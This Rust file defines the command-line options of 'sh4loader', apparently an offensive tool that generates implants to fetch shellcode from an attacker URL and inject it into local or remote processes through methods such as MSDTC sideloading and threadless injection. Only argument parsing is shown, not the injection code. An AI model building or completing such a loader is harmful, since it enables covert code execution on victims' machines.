use clap::Parser;

// sh4loader -m <method> -s <shellcode_path> -o <c_project_output> -u <url> -r/l
#[derive(Parser, Debug)]
#[command(author, version, about)]
#[clap(
    name = "sh4loader",
    author = "sh4n4c1",
    version = "2.0",
)]
pub struct Args {
    #[arg(short, long, help="injection method", value_name = "injection_method",
        help="the implants injection method, choose one of the following methods:\n
- msdtc_sideload 
- threadless\n")]
    pub method: String,

    #[arg(short = 'u' , long,
        value_name = "shellcode_downloaded_url",
        help="attacker shellcode download url, will be downloaded by the implants")]
    pub shellcode_url: String,

    #[arg(short = 'p', long, value_name = "local_shellcode_path",
    help="local shellcode path, will be encrypted
the implants will download the encrypted shellcode")]
    pub shellcode_path: String,

    #[arg(short, long, help="implant project output path", value_name = "c_project_output",
        help="the implants project output path")]
    pub output_path: String,

    #[arg(short = 'r', long, value_name = "remote injection", 
        required = false, help = "inject into remote process")]
    pub remote: bool,

    #[arg(short = 'd', long, value_name = "implants debug model", 
        required = false, help = "the implants trun on debug model, will print some information")]
    pub implants_debug: bool,
}
